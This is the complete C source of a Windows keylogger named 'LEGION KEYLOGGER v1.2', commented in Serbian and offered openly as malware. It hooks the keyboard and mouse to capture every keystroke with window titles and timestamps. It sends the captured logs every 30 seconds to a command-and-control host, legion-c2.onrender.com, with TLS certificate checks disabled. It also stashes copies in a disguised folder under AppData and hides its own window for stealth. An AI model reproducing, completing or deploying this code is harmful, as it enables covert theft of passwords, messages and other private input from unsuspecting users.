/*
 * LEGION KEYLOGGER v1.2 – ZA RENDER C2 (POTPUNO ISPRAVLJEN)
 * =====================================================================
 * - Snima sve pritisnute tipke
 * - Snima aktivni prozor
 * - Snima vreme
 * - Šalje na C2 server (Render.com)
 * - Čuva u fajl (fallback)
 * - RADI NA WINDOWS 10/11 (2026)
 * =====================================================================
 */

// =====================================================================
// HEADERI
// =====================================================================
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "shell32.lib")

// =====================================================================
// DEFINICIJE ZA STARIJE WINDOWS SDK (ISPRAVKA)
// =====================================================================
#ifndef WINHTTP_ACCESS_TYPE_DEFAULT
#define WINHTTP_ACCESS_TYPE_DEFAULT 0
#endif

#ifndef WINHTTP_FLAG_SECURE
#define WINHTTP_FLAG_SECURE 0x00800000
#endif

#ifndef SECURITY_FLAG_IGNORE_UNKNOWN_CA
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA 0x00000100
#endif

#ifndef SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
#define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID 0x00002000
#endif

#ifndef SECURITY_FLAG_IGNORE_CERT_CN_INVALID
#define SECURITY_FLAG_IGNORE_CERT_CN_INVALID 0x00001000
#endif

#ifndef SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE
#define SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE 0x00000200
#endif

// =====================================================================
// KONSTANTE
// =====================================================================
#define MAX_LOG_SIZE      (10 * 1024 * 1024)  // 10MB
#define SEND_INTERVAL     30000              // 30 sekundi (brže za test)
#define MAX_KEY_LENGTH    256
#define MAX_WINDOW_TITLE  256

// =====================================================================
// GLOBALNE VARIJABLE
// =====================================================================
char g_log_buffer[1024 * 1024];        // 1MB log buffer
int  g_log_index = 0;
CRITICAL_SECTION g_log_lock;
HHOOK g_keyboard_hook = NULL;
HHOOK g_mouse_hook = NULL;
volatile LONG g_running = 1;
char g_c2_domain[64] = "legion-c2.onrender.com";   // ← TVOJ RENDER URL
int  g_c2_port = 443;
char g_test_id[64] = "KEYLOG_001";
HWND g_last_window = NULL;
char g_last_window_title[MAX_WINDOW_TITLE] = {0};

// =====================================================================
// LOGWORM (samo za logovanje)
// =====================================================================
void LogWorm(const char* action, const char* target, const char* status) {
    // U produkciji - ne logovati ništa (stealth)
    // Ovo je samo za debug
    #ifdef _DEBUG
    printf("[%s] %s: %s\n", action, target, status);
    #endif
}

// =====================================================================
// KEY NAMES (Standardni ASCII)
// =====================================================================
const char* GetKeyName(DWORD vkCode) {
    if (vkCode >= 0x20 && vkCode <= 0x7E) {
        static char buf[2] = {0};
        buf[0] = (char)vkCode;
        return buf;
    }
    
    switch (vkCode) {
        case VK_RETURN:   return "[ENTER]\n";
        case VK_BACK:     return "[BACKSPACE]";
        case VK_TAB:      return "[TAB]";
        case VK_ESCAPE:   return "[ESC]";
        case VK_SPACE:    return " ";
        case VK_SHIFT:    return "[SHIFT]";
        case VK_CONTROL:  return "[CTRL]";
        case VK_MENU:     return "[ALT]";
        case VK_CAPITAL:  return "[CAPSLOCK]";
        case VK_DELETE:   return "[DEL]";
        case VK_INSERT:   return "[INS]";
        case VK_HOME:     return "[HOME]";
        case VK_END:      return "[END]";
        case VK_PRIOR:    return "[PAGEUP]";
        case VK_NEXT:     return "[PAGEDOWN]";
        case VK_LEFT:     return "[LEFT]";
        case VK_RIGHT:    return "[RIGHT]";
        case VK_UP:       return "[UP]";
        case VK_DOWN:     return "[DOWN]";
        case VK_PRINT:    return "[PRINT]";
        case VK_SNAPSHOT: return "[PRINTSCREEN]";
        case VK_PAUSE:    return "[PAUSE]";
        case VK_NUMLOCK:  return "[NUMLOCK]";
        case VK_SCROLL:   return "[SCROLL]";
        case VK_LWIN:     return "[WIN]";
        case VK_RWIN:     return "[WIN]";
        case VK_APPS:     return "[CONTEXT]";
        case VK_SLEEP:    return "[SLEEP]";
        case VK_F1:  return "[F1]";
        case VK_F2:  return "[F2]";
        case VK_F3:  return "[F3]";
        case VK_F4:  return "[F4]";
        case VK_F5:  return "[F5]";
        case VK_F6:  return "[F6]";
        case VK_F7:  return "[F7]";
        case VK_F8:  return "[F8]";
        case VK_F9:  return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        case VK_NUMPAD0: return "[NUMPAD0]";
        case VK_NUMPAD1: return "[NUMPAD1]";
        case VK_NUMPAD2: return "[NUMPAD2]";
        case VK_NUMPAD3: return "[NUMPAD3]";
        case VK_NUMPAD4: return "[NUMPAD4]";
        case VK_NUMPAD5: return "[NUMPAD5]";
        case VK_NUMPAD6: return "[NUMPAD6]";
        case VK_NUMPAD7: return "[NUMPAD7]";
        case VK_NUMPAD8: return "[NUMPAD8]";
        case VK_NUMPAD9: return "[NUMPAD9]";
        default: return "?";
    }
}

// =====================================================================
// DOHVATI AKTIVNI PROZOR
// =====================================================================
char* GetActiveWindowTitle(void) {
    static char title[MAX_WINDOW_TITLE] = {0};
    
    HWND hwnd = GetForegroundWindow();
    if (hwnd != g_last_window) {
        g_last_window = hwnd;
        GetWindowTextA(hwnd, title, sizeof(title));
        if (strlen(title) == 0) {
            strcpy(title, "[UNKNOWN]");
        }
        strcpy(g_last_window_title, title);
    }
    return g_last_window_title;
}

// =====================================================================
// KONVERTUJ VK KOD U KARAKTER
// =====================================================================
char GetCharFromVK(DWORD vkCode, DWORD flags) {
    BYTE keyboard_state[256];
    GetKeyboardState(keyboard_state);
    
    WCHAR wchar[2] = {0};
    int result = ToUnicode(vkCode, 0, keyboard_state, wchar, 1, 0);
    
    if (result == 1) {
        char ansi[4] = {0};
        WideCharToMultiByte(CP_ACP, 0, wchar, 1, ansi, sizeof(ansi), NULL, NULL);
        return ansi[0];
    }
    
    return 0;
}

// =====================================================================
// IGNORIŠI SSL GREŠKE (ZA SELF-SIGNED CERT)
// =====================================================================
void IgnoreSSLErrors(HINTERNET hRequest) {
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
}

// =====================================================================
// ŠALJI LOG NA C2
// =====================================================================
void SendLogToC2(const char* logData, int logLen) {
    if (logLen == 0) return;
    
    // Kreiraj JSON payload
    char payload[1024 * 1024]; // 1MB
    int payloadLen = snprintf(payload, sizeof(payload),
        "{\"id\":\"%s\",\"data\":\"", g_test_id);
    
    // Escape-uj za JSON
    for (int i = 0; i < logLen && payloadLen < sizeof(payload) - 10; i++) {
        char c = logData[i];
        if (c == '"') {
            payload[payloadLen++] = '\\';
            payload[payloadLen++] = '"';
        } else if (c == '\\') {
            payload[payloadLen++] = '\\';
            payload[payloadLen++] = '\\';
        } else if (c == '\n') {
            payload[payloadLen++] = '\\';
            payload[payloadLen++] = 'n';
        } else if (c == '\r') {
            payload[payloadLen++] = '\\';
            payload[payloadLen++] = 'r';
        } else if (c == '\t') {
            payload[payloadLen++] = '\\';
            payload[payloadLen++] = 't';
        } else {
            payload[payloadLen++] = c;
        }
    }
    
    payload[payloadLen++] = '"';
    payload[payloadLen++] = '}';
    payload[payloadLen] = 0;
    
    // Pošalji preko WinHTTP
    HINTERNET hSession = WinHttpOpen(L"LegionKeyLogger/1.2", 
        WINHTTP_ACCESS_TYPE_DEFAULT, NULL, NULL, 0);
    
    if (hSession) {
        wchar_t wDomain[64];
        MultiByteToWideChar(CP_ACP, 0, g_c2_domain, -1, wDomain, 64);
        
        HINTERNET hConnect = WinHttpConnect(hSession, wDomain, 
            g_c2_port, 0);
        
        if (hConnect) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", 
                L"/keylog", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
            
            if (hRequest) {
                // IGNORIŠI SSL GREŠKE (ZA RENDER)
                IgnoreSSLErrors(hRequest);
                
                wchar_t wPayload[1024 * 1024];
                MultiByteToWideChar(CP_ACP, 0, payload, -1, wPayload, 
                    sizeof(wPayload)/sizeof(wchar_t));
                
                WinHttpSendRequest(hRequest, 
                    L"Content-Type: application/json\r\n", -1,
                    wPayload, wcslen(wPayload) * sizeof(wchar_t), 0, 0);
                
                WinHttpReceiveResponse(hRequest, NULL);
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}

// =====================================================================
// SPA SI LOG NA DISK (FALLBACK)
// =====================================================================
void SaveLogToDisk(const char* logData, int logLen) {
    if (logLen == 0) return;
    
    char logPath[MAX_PATH];
    char appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    sprintf(logPath, "%s\\Microsoft\\Crypto\\RSA\\%d.log", 
        appData, GetCurrentProcessId());
    
    FILE* f = fopen(logPath, "ab");
    if (f) {
        fwrite(logData, 1, logLen, f);
        fclose(f);
        
        HANDLE hFile = CreateFileA(logPath, GENERIC_READ, FILE_SHARE_READ, 
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD size = GetFileSize(hFile, NULL);
            CloseHandle(hFile);
            
            if (size > MAX_LOG_SIZE) {
                char logPath2[MAX_PATH];
                sprintf(logPath2, "%s\\Microsoft\\Crypto\\RSA\\%d.old", 
                    appData, GetCurrentProcessId());
                DeleteFileA(logPath2);
                MoveFileA(logPath, logPath2);
            }
        }
    }
}

// =====================================================================
// THREAD ZA SEND LOG
// =====================================================================
DWORD WINAPI SendLogThread(LPVOID lpParam) {
    while (g_running) {
        Sleep(SEND_INTERVAL);
        
        EnterCriticalSection(&g_log_lock);
        if (g_log_index > 0) {
            char* logCopy = (char*)malloc(g_log_index + 1);
            if (logCopy) {
                memcpy(logCopy, g_log_buffer, g_log_index);
                logCopy[g_log_index] = 0;
                int logLen = g_log_index;
                g_log_index = 0;
                memset(g_log_buffer, 0, sizeof(g_log_buffer));
                
                LeaveCriticalSection(&g_log_lock);
                
                SendLogToC2(logCopy, logLen);
                SaveLogToDisk(logCopy, logLen);
                
                free(logCopy);
            } else {
                LeaveCriticalSection(&g_log_lock);
            }
        } else {
            LeaveCriticalSection(&g_log_lock);
        }
    }
    return 0;
}

// =====================================================================
// KEYBOARD HOOK
// =====================================================================
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = p->vkCode;
            
            char keyChar = GetCharFromVK(vkCode, p->flags);
            const char* keyName = NULL;
            if (keyChar != 0) {
                static char charBuf[2] = {0};
                charBuf[0] = keyChar;
                keyName = charBuf;
            } else {
                keyName = GetKeyName(vkCode);
            }
            
            char* windowTitle = GetActiveWindowTitle();
            
            EnterCriticalSection(&g_log_lock);
            
            if (strcmp(windowTitle, g_last_window_title) != 0) {
                strcpy(g_last_window_title, windowTitle);
                time_t now = time(NULL);
                struct tm* tm_info = localtime(&now);
                char timeStr[64];
                strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", tm_info);
                
                g_log_index += snprintf(g_log_buffer + g_log_index, 
                    sizeof(g_log_buffer) - g_log_index,
                    "\n[%s] [%s]\n", timeStr, windowTitle);
            }
            
            if (keyName && 
                vkCode != VK_SHIFT && 
                vkCode != VK_CONTROL && 
                vkCode != VK_MENU) {
                g_log_index += snprintf(g_log_buffer + g_log_index,
                    sizeof(g_log_buffer) - g_log_index,
                    "%s", keyName);
            }
            
            LeaveCriticalSection(&g_log_lock);
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// =====================================================================
// MOUSE HOOK
// =====================================================================
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {
            const char* button = (wParam == WM_LBUTTONDOWN) ? "[LEFT]" : "[RIGHT]";
            
            EnterCriticalSection(&g_log_lock);
            g_log_index += snprintf(g_log_buffer + g_log_index,
                sizeof(g_log_buffer) - g_log_index,
                "%s", button);
            LeaveCriticalSection(&g_log_lock);
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// =====================================================================
// INICIJALIZACIJA HOOK-OVA
// =====================================================================
int InitializeHooks(void) {
    g_keyboard_hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, 
        GetModuleHandle(NULL), 0);
    if (!g_keyboard_hook) {
        return 0;
    }
    
    g_mouse_hook = SetWindowsHookExA(WH_MOUSE_LL, MouseProc, 
        GetModuleHandle(NULL), 0);
    if (!g_mouse_hook) {
        // Nije kritično
    }
    
    return 1;
}

// =====================================================================
// GLAVNA FUNKCIJA
// =====================================================================
int KeyloggerMain(void) {
    InitializeCriticalSection(&g_log_lock);
    
    if (!InitializeHooks()) {
        LogWorm("KEYLOG", "Hook init", "FAILED");
        return 0;
    }
    
    sprintf(g_test_id, "KEYLOG_%d_%lld", GetCurrentProcessId(), 
        (long long)time(NULL));
    
    LogWorm("KEYLOG", "Started", g_test_id);
    
    HANDLE hSendThread = CreateThread(NULL, 0, SendLogThread, NULL, 0, NULL);
    if (!hSendThread) {
        LogWorm("KEYLOG", "Thread", "FAILED");
        return 0;
    }
    
    MSG msg;
    while (g_running) {
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        } else {
            Sleep(10);
        }
        
        if (GetAsyncKeyState(VK_F12) & 0x8000) {
            g_running = 0;
            break;
        }
    }
    
    if (g_keyboard_hook) UnhookWindowsHookEx(g_keyboard_hook);
    if (g_mouse_hook) UnhookWindowsHookEx(g_mouse_hook);
    
    if (hSendThread) {
        WaitForSingleObject(hSendThread, 5000);
        CloseHandle(hSendThread);
    }
    
    DeleteCriticalSection(&g_log_lock);
    
    LogWorm("KEYLOG", "Stopped", "OK");
    
    return 1;
}

// =====================================================================
// WINMAIN
// =====================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    KeyloggerMain();
    
    return 0;
}